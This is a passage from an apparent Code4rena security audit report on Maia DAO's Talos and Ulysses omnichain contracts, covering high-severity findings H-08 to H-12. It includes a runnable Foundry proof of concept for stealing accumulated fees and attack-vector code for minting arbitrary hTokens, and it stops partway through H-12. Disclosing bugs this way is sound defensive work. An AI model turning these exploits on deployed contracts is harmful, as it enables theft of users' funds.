InTalosStrategyStaked.sol, if the user’sshareshave changed, we need to callflywheel.accrue()first, which will accruerewardsand update the correspondinguserIndex. This way, we can ensure the accuracy ofrewards. So we will callflywheel.accrue()beforebeforeDeposit/beforeRedeem/transfer etc.
Takeredeem()as an example, the code is as follows:
contractTalosStrategyStakedisTalosStrategySimple,ITalosStrategyStaked{...functionbeforeRedeem(uint256_tokenId,address_owner)internaloverride{_earnFees(_tokenId);@>flywheel.accrue(_owner);}
But whenbeforeRedeem()is called with the wrong owner passed in. Theredeem()code is as follows:
functionredeem(uint256shares,uint256amount0Min,uint256amount1Min,addressreceiver,address_owner)publicvirtualoverridenonReentrantcheckDeviationreturns(uint256amount0,uint256amount1){...if(msg.sender!=_owner) {uint256allowed=allowance[_owner][msg.sender];// Saves gas for limited approvals.if(allowed!=type(uint256).max)allowance[_owner][msg.sender] =allowed-shares;}if(shares==0)revertRedeemingZeroShares();if(receiver==address(0))revertReceiverIsZeroAddress();uint256_tokenId=tokenId;@>beforeRedeem(_tokenId,receiver);INonfungiblePositionManager_nonfungiblePositionManager=nonfungiblePositionManager;// Saves an extra SLOAD{uint128liquidityToDecrease=uint128((liquidity*shares) /totalSupply);(amount0,amount1) =_nonfungiblePositionManager.decreaseLiquidity(INonfungiblePositionManager.DecreaseLiquidityParams({tokenId:_tokenId,liquidity:liquidityToDecrease,amount0Min:amount0Min,amount1Min:amount1Min,deadline:block.timestamp}));if(amount0==0&&amount1==0)revertAmountsAreZero();@>_burn(_owner,shares);liquidity-=liquidityToDecrease;}
From the above code, we see that the parameter is thereceiver, but the person whose shares are burned is_owner.
We need to accrue_owner, notreceiver. This leads to a direct reduction of the user’s shares withoutaccrue, and the user loses the corresponding rewards.
Recommended Mitigation Steps
functionredeem(uint256shares,uint256amount0Min,uint256amount1Min,addressreceiver,address_owner)publicvirtualoverridenonReentrantcheckDeviationreturns(uint256amount0,uint256amount1){if(msg.sender!=_owner) {uint256allowed=allowance[_owner][msg.sender];// Saves gas for limited approvals.if(allowed!=type(uint256).max)allowance[_owner][msg.sender] =allowed-shares;}if(shares==0)revertRedeemingZeroShares();if(receiver==address(0))revertReceiverIsZeroAddress();uint256_tokenId=tokenId;-beforeRedeem(_tokenId,receiver);+beforeRedeem(_tokenId,_owner);
Assessed type
Context
0xLightt (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-08] Due to inadequate checks, an adversary can callBranchBridgeAgent#retrieveDepositwith an invalid_depositNonce, which would lead to a loss of other users’ deposits.
Submitted byEmmanuel, also found byxuwinnie
An attacker will cause the user’s funds to be collected and locked on Branch chain without it being recorded on the root chain.
Proof of Concept
Anyone can callBranchBridgeAgent#retrieveDepositwith an invalid_depositNonce:
functionretrieveDeposit(uint32_depositNonce)externalpayablelockrequiresFallbackGas{//Encode Data for cross-chain call.bytesmemorypackedData=abi.encodePacked(bytes1(0x08),_depositNonce,msg.value.toUint128(),uint128(0));//Update State and Perform Call_sendRetrieveOrRetry(packedData);}
For example, if globaldepositNonceis “x”, an attacker can callretrieveDeposit(x+y).RootBridgeAgent#anyExecutewill be called and theexecutionHistoryfor thedepositNoncethat the attacker specified would be updated to true.
functionanyExecute(bytescalldatadata){.../// DEPOSIT FLAG: 8 (retrieveDeposit)elseif(flag==0x08) {//Get nonceuint32nonce=uint32(bytes4(data[1:5]));//Check if tx has already been executedif(!executionHistory[fromChainId][uint32(bytes4(data[1:5]))]) {//Toggle Nonce as executedexecutionHistory[fromChainId][nonce] =true;//Retry failed fallback(success,result) = (false,"");}else{_forceRevert();//Return true to avoid triggering anyFallback in case of `_forceRevert()` failurereturn(true,"already executed tx");}}...}
This means, that when a user makes a deposit on theBranchBridgeAgentand their deposit gets assigned adepositNonce, which the attacker previously calledretrieveDepositfor, their tokens would be collected on theBranchBridgeAgent, but would not succeed onRootBridgeAgent. This is becauseexecutionHistoryfor thatdepositNoncehas already been maliciously set to true.
Attack Scenario
The current globaldepositNonceis 50.An attacker callsretrieveDeposit(60), which would updateexecutionHistoryofdepositNonce(60) to true on the Root chain.When a user tries to call any of the functions (saycallOutAndBridge) and gets assigneddepositNonceof 60, it won’t be executed on root chain becauseexecutionHistoryfordepositNonce(60) is already set to true.A user won’t also be able to claim their tokens becauseanyFallbackwas not triggered. So they have lost their deposit.
Recommended Mitigation Steps
A very simple and effective solution is to ensure that in theBranchBridgeAgent#retrieveDepoitfunction,msg.sender==getDeposit[_depositNonce].owneris called just like it was done inBranchBridgeAgent#retryDeposit.
Assessed type
Invalid Validation
0xBugsy (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-09]RootBridgeAgent->CheckParamsLib#checkParamsdoes not check that_dParams.tokenis underlying of_dParams.hToken
Submitted byEmmanuel, also found byxuwinnie
A malicious user would make a deposit specifying ahTokenof a high value (say hEther), and adepositTokenof relatively lower value (say USDC). For that user,RootBridgeAgentwould increment theirhTokenbalance by the amount ofdepositTokensthey sent.
Proof of Concept
Here is thecheckParamsfunction:
functioncheckParams(address_localPortAddress,DepositParamsmemory_dParams,uint24_fromChain)internalviewreturns(bool){if((_dParams.amount<_dParams.deposit)//Deposit can't be greater than amount.|| (_dParams.amount>0&& !IPort(_localPortAddress).isLocalToken(_dParams.hToken,_fromChain))//Check local exists.|| (_dParams.deposit>0&& !IPort(_localPortAddress).isUnderlyingToken(_dParams.token,_fromChain))//Check underlying exists.) {returnfalse;}returntrue;}
The function performs 3 checks:
The_dParams.amountmust be less than or equal to_dParams.deposit.If_dParams.amount > 0,_dParams.hTokenmust be a validlocalToken.If_dParams.deposit > 0,_dParams.tokenmust be a valid underlying token.
The problem is that the check only requiresgetLocalTokenFromUnder[_dParams.token]!=address(0), but does not check thatgetLocalTokenFromUnder[_dParams.token]==_dParams.hToken:
functionisUnderlyingToken(address_underlyingToken,uint24_fromChain)externalviewreturns(bool) {returngetLocalTokenFromUnder[_underlyingToken][_fromChain] !=address(0);}
ThecheckParamsfunction is used in theRootBridgeAgent#bridgeInfunction. This allows a user to callBranchBridgeAgent#callOutAndBridgewith ahTokenandtokenthat are not related.
ATTACK SCENARIO
The current price of Ether is 1800USDC.RootBridgeAgentis deployed on Arbitrum.BranchBridgeAgentfor the Ethereum mainnet has two local tokens recorded inRootBridgeAgent:hEther (whose underlying is Ether).hUSDC (whose underlying is USDC).Alice callsBranchBridgeAgent#callOutAndBridgeon Ethereum with the following asDepositInput(_dParams):hToken (address of local hEther).token (address of USDC).amount (0).deposit (10).toChain(42161).BranchPort#bridgeOuttransfers 10 USDC from the user toBranchPort, and theanyCallcall is made toRootBridgeAgent.RootBridgeAgent#bridgeInis called, which callsCheckParamsLib.checkParams.checkParamsverifies that_dParams.amount(0)is less than or equal to_dParams.deposit(10).Verifies that_dParams.hToken(hEther) is a validlocalToken.Verifies that_dParams.token(USDC) is a valid underlying token (i.e. its local token is non zero).RootBridgeAgent#bridgeIncallsRootPort#bridgeToRootwhich mints 10 global hEther to the userif (_deposit > 0) mint(_recipient, _hToken, _deposit, _fromChainId);.With just 10 USDC, the user has been able to get 10 ether (18000USDC) worth of funds on the root chain.
Execution flow:BranchBridgeAgent#callOutAndBridge->BranchBridgeAgent#_callOutAndBridge->BranchBridgeAgent#_depositAndCall->BranchBridgeAgent#_performCall->RootBridgeAgent#anyExecute->RootBridgeAgentExecutor#executeWithDeposit->RootBridgeAgentExecutor#_bridgeIn->RootBridgeAgent#bridgeIn.
Recommended Mitigation Steps
Currently, the protocol only checks to see if the token is recognized byrootportas an underlying token by checking that the registered local token for_dParams.tokenis a non zero address.
Instead of that, it would be more effective to check that the registered local token for_dParams.tokenis equal to_dParams.hToken. Some sanity checks may also be done onDepositInput(_dParams)inBranchBridgeAgent. Although, this is not necessary.
Assessed type
Invalid Validation
0xBugsy (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-10]TalosBaseStrategy#init()lacks slippage protection
Submitted byAlexCzm, also found bylos_chicos,said, andT1MOH
ThecheckDeviations modifier’s purpose is to add slippage protection for an increase/decrease in liquidity operations. It’s applied todeposit/redeem,rerange/rebalancebutinit()is missing it.
Impact
There is no slippage protection oninit().
Proof of Concept
In theinit()function ofTalosBaseStrategy, the following actions are performed: an initial deposit is made, a tokenId and shares are minted.
The_nonfungiblePositionManager.mint()function is called with hardcoded values ofamount0Minandamount1Minboth set to 0. Additionally, it should be noted that theinit()function does not utilize thecheckDeviationmodifier, which was specifically designed to safeguard users against slippage.
functioninit(uint256amount0Desired,uint256amount1Desired,addressreceiver)externalvirtualnonReentrantreturns(uint256shares,uint256amount0,uint256amount1){...(_tokenId,_liquidity,amount0,amount1) =_nonfungiblePositionManager.mint(INonfungiblePositionManager.MintParams({token0:address(_token0),token1:address(_token1),fee:poolFee,tickLower:tickLower,tickUpper:tickUpper,amount0Desired:amount0Desired,amount1Desired:amount1Desired,amount0Min:0,amount1Min:0,recipient:address(this),deadline:block.timestamp}));...
https://github.com/Maia-DAO/maia-ecosystem-monorepo/blob/2f6e87348877684aa0c12aec204fea210cfbe6eb/src/scope/talos/base/TalosBaseStrategy.sol#L99-L147
/// @notice Function modifier that checks if price has not moved a lot recently./// This mitigates price manipulation during rebalance and also prevents placing orders when it's too volatile.modifiercheckDeviation() {ITalosOptimizer_optimizer=optimizer;pool.checkDeviation(_optimizer.maxTwapDeviation(),_optimizer.twapDuration());_;}
https://github.com/Maia-DAO/maia-ecosystem-monorepo/blob/2f6e87348877684aa0c12aec204fea210cfbe6eb/src/scope/talos/base/TalosBaseStrategy.sol#L419-L425
Tools Used
VS Code,uniswapv3book
Recommended Mitigation Steps
ApplycheckDeviationtoinit()function.
Trust (judge) increased severity to High
0xLightt (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-11] An attacker can steal Accumulated Awards fromRootBridgeAgentby abusingretrySettlement()
Submitted byVoyvoda, also found byxuwinnie
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L238-L272https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1018-L1054https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/VirtualAccount.sol#L41-L53https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L1177-L1216https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/MulticallRootRouter.sol#L345-L409
The Accumulated Awards insideRootBridgeAgent.solcan be stolen. The Accumulated Awards state will be compromised and awards will be stuck.
Proof of Concept
Note: An end-to-end coded PoC is at the end of the PoC section.
Gas state
The gas related state insideRootBridgeAgentconsists of:
initialGas: a checkpoint that recordsgasleft()at the start ofanyExecutethat has been called byMultichainwhen we have a cross-chain call.userFeeInfo: this is a struct that containsdepositedGaswhich is the total amount of gas that the user has paid for on aBranchChain. The struct also containsgasToBridgeOut, which is the amount of gas to be used for further cross-chain executions. The assumption is thatgasToBridgeOut < depositedGaswhich is checked at the start ofanyExecute(...).At the end ofanyExecute(...): the function_payExecutionGas()is invoked that calculates the supplied gas available for execution on the RootavaliableGas = _depositedGas - _gasToBridgeOutand then a check is performed ifavailableGasis enough to coverminExecCost, (which uses theinitialGascheckpoint and subtracts a secondgasleft()checkpoint to represent the end of execution on the Root). The difference betweenavailableGasandminExecCostis the profit for the protocol is recorded insideaccumulatedFeesstate variable.
function_payExecutionGas(uint128_depositedGas,uint128_gasToBridgeOut,uint256_initialGas,uint24_fromChain)internal{//reset initial remote execution gas and remote execution fee informationdelete(initialGas);delete(userFeeInfo);if(_fromChain==localChainId)return;//Get Available Gasuint256availableGas=_depositedGas-_gasToBridgeOut;//Get Root Environment Execution Costuint256minExecCost=tx.gasprice* (MIN_EXECUTION_OVERHEAD+_initialGas-gasleft());//Check if sufficient balanceif(minExecCost>availableGas) {_forceRevert();return;}//Replenish Gas_replenishGas(minExecCost);//Account for excess gasaccumulatedFees+=availableGas-minExecCost;}
Settlements
These are records of tokens that are “bridged out” (transferred) through theRootBridgeAgentto aBranchBridgeAgent. By default, when a settlement is created it is “successful”, unless the execution on the Branch Chain fails andanyFallback(...)is called on theRootBridgeAgent, which will set the settlement status as “failed”.
An example way to create a settlement, will be to “bridge out” some of the assets fromBranchBridgeAgenttoRootBridgeAgentand embed extra data that represents another bridge operation fromRootBridgeAgenttoBranchBridgeAgent. This flow passes through theMulticallRootRouterand could be the same branch agent as the first one or different. At this point, a settlement will be created. Moreover, a settlement could fail, for example, because of insufficientgasToBridgeOutprovided by the user. In that case,anyFallbackis triggered on theRootBridgeAgent, failing the settlement. At this time,retrySettlement()becomes available to call for the particular settlement.
The attack
Let’s first examine closely theretrySettlement()function:
functionretrySettlement(uint32_settlementNonce,uint128_remoteExecutionGas)externalpayable{//Update User Gas available.if(initialGas==0) {userFeeInfo.depositedGas=uint128(msg.value);userFeeInfo.gasToBridgeOut=_remoteExecutionGas;}//Clear Settlement with updated gas._retrySettlement(_settlementNonce);}
IfinitialGas == 0, it is assumed that someone directly callsretrySettlement(...)and therefore has to deposit gas (msg.value). However, ifinitialGas > 0, it is assumed thatretrySettlement(...)could be part of ananyExecute(...)call that contained instructions for theMulticallRootRouterto do the call through aVirtualAccount. Let’s assume the second scenario whereinitialGas > 0and examine the internal_retrySettlement:
First, we have the call to_manageGasOut(...), where again ifinitialGas > 0, we assume that theretrySettlement(...)is withinanyExecute; therefore, theuserFeeInfostate is already set. From there, we perform a_gasSwapOut(...)withuserFeeInfo.gasToBridgeOutwhere we swap thegasToBridgeOutamount ofwrappedNativefor gas tokens that are burned. Then, back in the internal_retrySettlement(...), the new gas is recorded in the settlement record and the message is sent to a Branch Chain viaanyCall.
The weakness here, is that after we retry a settlement withuserFeeInfo.gasToBridgeOutwe do not setuserFeeInfo.gasToBridgeOut = 0. Which if we perform only 1retrySettlement(...), it is not exploitable; however, if we embed in a singleanyExecute(...)in severalretrySettlement(...)calls, it becomes obvious that we can pay 1 time forgasToBridgeOuton a Branch Chain and use it multiple times on theRootChainto fuel the manyretrySettlement(...)calls.
The second feature that will be part of the attack, is that on a Branch Chain we get refunded for the excess ofgasToBridgeOutthat wasn’t used for execution on the Branch Chain.
function_retrySettlement(uint32_settlementNonce)internalreturns(bool) {//Get SettlementSettlementmemorysettlement=getSettlement[_settlementNonce];//Check if Settlement hasn't been redeemed.if(settlement.owner==address(0))returnfalse;//abi encodePackedbytesmemorynewGas=abi.encodePacked(_manageGasOut(settlement.toChain));//overwrite last 16bytes of callDatafor(uint256i=0;i<newGas.length;) {settlement.callData[settlement.callData.length-16+i] =newGas[i];unchecked{++i;}}SettlementstoragesettlementReference=getSettlement[_settlementNonce];//Update Gas To Bridge OutsettlementReference.gasToBridgeOut=userFeeInfo.gasToBridgeOut;//Set Settlement Calldata to send to Branch ChainsettlementReference.callData=settlement.callData;//Update Settlement StatussettlementReference.status=SettlementStatus.Success;//Retry call with additional gas_performCall(settlement.callData,settlement.toChain);//Retry Successreturntrue;}
An attacker will trigger some number ofcallOutAndBridge(...)invocations from a Branch Chain, with some assets and extra data that will callcallOutAndBridge(...)on the Root Chain to transfer back these assets to the originating Branch Chain (or any other Branch Chain). However, the attacker will set minimumdepositedGasto ensure execution on the Root Chain, but insufficient gas to complete remote execution on the Branch Chain; therefore, failing a number of settlements. The attacker will then follow with acallOutAndBridge(...)from a Branch Chain that contains extra data for theMutlicallRouterand for theVirtualAccountto callretrySettlement(...)for every “failed” settlement. Since we will have multipleretrySettlement(...)invocations inside a singleanyExecute, at some point thegasToBridgeOutsent to each settlement will become>the deposited gas and we will be spending from the Root Branch reserves (accumulated rewards). The attacker will redeem their profit on the Branch Chain, since they get a gas refund. Therefore, there will also be a mismatch betweenaccumulatedRewardsand the native currency inRootBridgeAgent, causingsweep()to revert and anyaccumulatedRewardsleft will be bricked.
Coded PoC
Copy the two functionstestGasIssueand_prepareDepositintest/ulysses-omnichain/RootTest.t.soland place them in theRootTestcontract after the setup.
Execute withforge test --match-test testGasIssue -vv.
Result: the attacker starts with1000000000000000000wei (1 ether) and has1169999892307980000wei (>1 ether) after the execution of the attack (the end number could be slightly different, depending on foundry version), which is a mismatch betweenaccumulatedRewardsand the amount of WETH in the contract.
Note - there are console logs added from the developers in some of the mock contracts. Consider commenting them out for clarity of the output.
functiontestGasIssue()public{testAddLocalTokenArbitrum();console2.log("---------------------------------------------------------");console2.log("-------------------- GAS ISSUE START---------------------");console2.log("---------------------------------------------------------");// Accumulate rewards in RootBridgeAgentaddresssome_user=address(0xAAEE);hevm.deal(some_user,1.5ether);// Not a valid flag, MulticallRouter will return false, that's fine, we just want to credit some feesbytesmemoryempty_params=abi.encode(bytes1(0x00));hevm.prank(some_user);avaxMulticallBridgeAgent.callOut{value:1.1ether}(empty_params,0);// Get the global(root) address for the avax H mock tokenaddressglobalAddress=rootPort.getGlobalTokenFromLocal(avaxMockAssethToken,avaxChainId);// Attacker starts with 1 etheraddressattacker=address(0xEEAA);hevm.deal(attacker,1ether);// Mint 1 ether of the avax mock underlying tokenhevm.prank(address(avaxPort));MockERC20(address(avaxMockAssetToken)).mint(attacker,1ether);// Attacker approves the underlying tokenhevm.prank(attacker);MockERC20(address(avaxMockAssetToken)).approve(address(avaxPort),1ether);// Print out the amounts of WrappedNative & AccumulateAwards stateconsole2.log("RootBridge WrappedNative START",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));console2.log("RootBridge ACCUMULATED FEES START",multicallBridgeAgent.accumulatedFees());// Attacker's underlying avax mock token balanceconsole2.log("Attacker underlying token balance avax",avaxMockAssetToken.balanceOf(attacker));// Prepare a single deposit with remote gas that will cause the remote exec from the root to branch to fail// We will have to mock this fail since we don't have the MultiChain contracts, but the provided// Mock Anycall has anticipated for thatDepositInputmemorydeposit=_prepareDeposit();uint128remoteExecutionGas=2_000_000_000;Multicall2.Call[]memorycalls=newMulticall2.Call[](0);OutputParamsmemoryoutputParams=OutputParams(attacker,globalAddress,500,500);bytesmemoryparams=abi.encodePacked(bytes1(0x02),abi.encode(calls,outputParams,avaxChainId));console2.log("ATTACKER ETHER BALANCE START",attacker.balance);// Toggle anyCall for 1 call (Bridge -> Root), this config won't do the 2nd anyCall// Root -> Bridge (this is how we mock BridgeAgent reverting due to insufficient remote gas)MockAnycall(local`AnyCall`Address).toggleFallback(1);// executehevm.prank(attacker);// in reality we need 0.00000002 (supply a bit more to make sure we don't fail execution on the root)avaxMulticallBridgeAgent.callOutSignedAndBridge{value:0.00000005ether}(params,deposit,remoteExecutionGas);// Switch to normal modeMockAnycall(local`AnyCall`Address).toggleFallback(0);// this will call anyFallback() on the Root and Fail the settlementMockAnycall(local`AnyCall`Address).testFallback();// Repeat for 1 more settlementMockAnycall(local`AnyCall`Address).toggleFallback(1);hevm.prank(attacker);avaxMulticallBridgeAgent.callOutSignedAndBridge{value:0.00000005ether}(params,deposit,remoteExecutionGas);MockAnycall(local`AnyCall`Address).toggleFallback(0);MockAnycall(local`AnyCall`Address).testFallback();// Print out the amounts of WrappedNative & AccumulateAwards state  after failing the settlements but before the attackconsole2.log("RootBridge WrappedNative AFTER SETTLEMENTS FAILURE BUT BEFORE ATTACK",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));console2.log("RootBridge ACCUMULATED FEES AFTER SETTLEMENTS FAILURE BUT BEFORE ATTACK",multicallBridgeAgent.accumulatedFees());// Encode 2 calls to retrySettlement(), we can use 0 remoteGas arg since// initialGas > 0 because we execute the calls as a part of an anyExecute()Multicall2.Call[]memorymalicious_calls=newMulticall2.Call[](2);bytes4selector=bytes4(keccak256("retrySettlement(uint32,uint128)"));malicious_calls[0] =Multicall2.Call({target:address(multicallBridgeAgent),callData:abi.encodeWithSelector(selector,1,0)});malicious_calls[1] =Multicall2.Call({target:address(multicallBridgeAgent),callData:abi.encodeWithSelector(selector,2,0)});// malicious_calls[2] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,3,0)});outputParams=OutputParams(attacker,globalAddress,500,500);params=abi.encodePacked(bytes1(0x02),abi.encode(malicious_calls,outputParams,avaxChainId));// At this point root now has ~1.1hevm.prank(attacker);avaxMulticallBridgeAgent.callOutSignedAndBridge{value:0.1ether}(params,deposit,0.09ether);// get attacker's virtual account addressaddressvaccount=address(rootPort.getUserAccount(attacker));console2.log("ATTACKER underlying balance avax",avaxMockAssetToken.balanceOf(attacker));console2.log("ATTACKER global avax h token balance root",ERC20hTokenRoot(globalAddress).balanceOf(vaccount));console2.log("ATTACKER ETHER BALANCE END",attacker.balance);console2.log("RootBridge WrappedNative END",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));console2.log("RootBridge ACCUMULATED FEES END",multicallBridgeAgent.accumulatedFees());console2.log("---------------------------------------------------------");console2.log("-------------------- GAS ISSUE END ----------------------");console2.log("---------------------------------------------------------");}function_prepareDeposit()internalreturns(DepositInputmemory) {// hToken addressaddressaddr1=avaxMockAssethToken;// underlying addressaddressaddr2=address(avaxMockAssetToken);uint256amount1=500;uint256amount2=500;uint24toChain=rootChainId;returnDepositInput({hToken:addr1,token:addr2,amount:amount1,deposit:amount2,toChain:toChain});}
Recommendation
It is hard to conclude a particular fix, but consider settinguserFeeInfo.gasToBridgeOut = 0afterretrySettlementas part of the mitigation.
Assessed type
Context
0xBugsy (Maia) confirmed, but disagreed with severity and commented:
The fix recommended for this issue was saving the available gas and clearing thegasToBridgeOutafter eachmanageGasOutin order to avoid this double spending and using available gas inpayExecutionGas.
Trust (judge) commented:
Loss of yield = loss of funds. High impact from my perspective.
0xLightt (Maia) commented:
We recognize the audit’s findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.

[H-12] An attacker can mint an arbitrary amount ofhTokenonRootChain
Submitted byVoyvoda
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L275-L316https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgentExecutor.sol#L259-L299https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L404-L426https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootPort.sol#L276-L284
Impact
An adversary can construct an attack vector that let’s them mint an arbitrary amount of hToken’s on theRootChain.
Proof of Concept
Note: An end-to-end coded PoC is at the end of PoC section.
Background
The attack will start on a Branch Chain where we have some underlying ERC20tokenand a correspondinghTokenthat representstokenwithin the omnichain system. ThecallOutSignedAndBridgeMultiple(...)function is supposed to bridge multiple tokens to a destination chain and also carry themsg.senderso that the tokens can be credited tomsg.sender’sVirtualAccount. The attacker will call the function withDepositMultipleInputParams_dParamsthat take advantage of several weaknesses contained within the function.
Below is an overview of theDepositMultipleInputstruct and flow diagram ofBranchBridgeAgent:
structDepositMultipleInput{//Deposit Infoaddress[]hTokens;//Input Local hTokens Address.address[]tokens;//Input Native / underlying Token Address.uint256[]amounts;//Amount of Local hTokens deposited for interaction.uint256[]deposits;//Amount of native tokens deposited for interaction.uint24toChain;//Destination chain for interaction.}
flowchart TBA["callOutSignedAndBridgeMultiple(,DepositMultipleInput memory _dParams,)"]-->|1 |B["_depositAndCallMultiple(...)"]B --> |2| C["_createDepositMultiple(...)"]B --> |4| D["__performCall(_data)"]C --> |3| E["IPort(address).bridgeOutMultiple(...)"]
Weakness#1is that the supplied array of tokensaddress[] hTokensin_dParamsis not checked if it exceeds 256. This causes an obvious issue where ifhTokenslength is>256, the recorded length inpackedDatawill be wrong since it’s using an unsafe cast touint8and will overflow:uint8(_dParams.hTokens.length).
functioncallOutSignedAndBridgeMultiple(bytescalldata_params,DepositMultipleInputmemory_dParams,uint128_remoteExecutionGas)externalpayablelockrequiresFallbackGas{// code ...//Encode Data for cross-chain call.bytesmemorypackedData=abi.encodePacked(bytes1(0x06),msg.sender,uint8(_dParams.hTokens.length),depositNonce,_dParams.hTokens,_dParams.tokens,_dParams.amounts,_deposits,_dParams.toChain,_params,msg.value.toUint128(),_remoteExecutionGas);// code ..._depositAndCallMultiple(...);}
Weakness#2arises in the subsequent internal function_depositAndCallMultiple(...), where the only check performed on the suppliedhTokens,tokens,amountsanddepositsarrays is if the lengths match; however, there is no check if the length is the same as the one passed earlier topackedData.
function_depositAndCallMultiple(address_depositor,bytesmemory_data,address[]memory_hTokens,address[]memory_tokens,uint256[]memory_amounts,uint256[]memory_deposits,uint128_gasToBridgeOut)internal{//Validate Inputif(_hTokens.length!=_tokens.length||_tokens.length!=_amounts.length||_amounts.length!=_deposits.length)revertInvalidInput();//Deposit and Store Info_createDepositMultiple(_depositor,_hTokens,_tokens,_amounts,_deposits,_gasToBridgeOut);//Perform Call_performCall(_data);}
Lastly, weakness#3is thatbridgeOutMultiple(...), called within_createDepositMultiple(...), allows for supplying any address in thehTokensarray since it only performs operations on these addresses if_deposits[i] > 0or_amounts[i] - _deposits[i] > 0. In other words, if we setdeposits[i] = 0andamounts[i] = 0, we can supply ANY address inhTokens[i].
functionbridgeOutMultiple(address_depositor,address[]memory_localAddresses,address[]memory_underlyingAddresses,uint256[]memory_amounts,uint256[]memory_deposits)externalvirtualrequiresBridgeAgent{for(uint256i=0;i<_localAddresses.length;) {if(_deposits[i] >0) {_underlyingAddresses[i].safeTransferFrom(_depositor,address(this),_denormalizeDecimals(_deposits[i],ERC20(_underlyingAddresses[i]).decimals()));}if(_amounts[i] -_deposits[i] >0) {_localAddresses[i].safeTransferFrom(_depositor,address(this),_amounts[i] -_deposits[i]);ERC20hTokenBranch(_localAddresses[i]).burn(_amounts[i] -_deposits[i]);}unchecked{i++;}}}
Supplying the attack vector
The attacker will constructDepositMultipleInput _dParamswhereaddress[] hTokenswill have a length of 257 where all entries, excepthTokens[1],hTokens[2]andhTokens[3], will contain the Branch address of the samehToken. Note that, in the examined functions above, there is no restriction to supply the samehTokenaddress multiple times.
In a similar way,address[] tokenswill have a length of 257; however, here all entries will contain the underlyingtoken. It is crucial to include the address of the underlyingtokento bypass_normalizeDecimals.
Nextuint256[] amountswill be of length 257, where all entries will contain 0. Similarly,uint256[] depositswill be of length 257, where all entries will contain 0. In such configuration, the attacker is able to supply a malicioushTokenaddress as per weakness#3.
The crucial part now, is thathTokens[1]will contain the address of the underlyingtoken. This is needed to later bypass the params check on theRootChain.
hTokens[2] & hTokens[3]will contain the attacker’s malicious payload address, which when converted to bytes and thenuint256, will represent the arbitrary amount of tokens that the attacker will mint (this conversion will happen on theRootChain).
This is how the attack vector looks expressed in code:
// hToken address, note the "h" in the var nameaddressaddr1=avaxMockAssethToken;// underlying addressaddressaddr2=address(avaxMockAssetToken);// 0x2FAF0800 when packed to bytes and then cast to uint256 = 800000000// this amount will be minted on Rootaddressmalicious_address=address(0x2FAF0800);uint256amount1=0;uint256amount2=0;uintnum=257;address[]memoryhtokens=newaddress[](num);address[]memorytokens=newaddress[](num);uint256[]memoryamounts=newuint256[](num);uint256[]memorydeposits=newuint256[](num);for(uinti=0;i<num;i++) {htokens[i] =addr1;tokens[i] =addr2;amounts[i] =amount1;deposits[i] =amount2;}// address of the underlying tokenhtokens[1] =addr2;// copy of entry containing the arbitrary number of tokenshtokens[2] =malicious_address;// entry containing the arbitrary number of tokens -> this one will be actually fed to mint on Roothtokens[3] =malicious_address;uint24toChain=rootChainId;// create inputDepositMultipleInputmemoryinput=DepositMultipleInput({hTokens:htokens,tokens:tokens,amounts:amounts,deposits:deposits,toChain:toChain});
Essentially, what happens now is the attacker haspackedDatathat contains 257hTokens,tokens,amountsanddeposits; however, due to weakness#1the recorded length is 1 and due to weaknesses#2and#3, this construction of the input will reach_peformCal(data). The mismatch between the number of entries and the actual number of supplied entries will cause malicious behavior on theRootChain.
bytesmemorypackedData=abi.encodePacked(bytes1(0x06),msg.sender,uint8(_dParams.hTokens.length),depositNonce,_dParams.hTokens,_dParams.tokens,_dParams.amounts,_deposits,_dParams.toChain,_params,msg.value.toUint128(),_remoteExecutionGas);
The attack vector is in line with the general encoding scheme displayed below. The important note is that “Length” will contain a value of 1 instead of 257, which will disrupt the decoding on theRootBranch. More details about the encoding can be found inIRootBridgeAgent.sol.
+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+|  Flag  |  Signer  | Length | depositNonce | hTokens[0], [1] ... [256] | tokens[0] ... [256] | amounts[0] ... [256] | deposits[0] ... [256] | toChain | data |   gas    |+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+| 1 byte | 20 bytes | 1 byte |   4 bytes    |       32 bytes * 257      |    32 bytes * 257   |    32 bytes * 257    |     32 bytes * 257    | 3 bytes | any  | 32 bytes |+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+
RootBranchreceives the attack vector
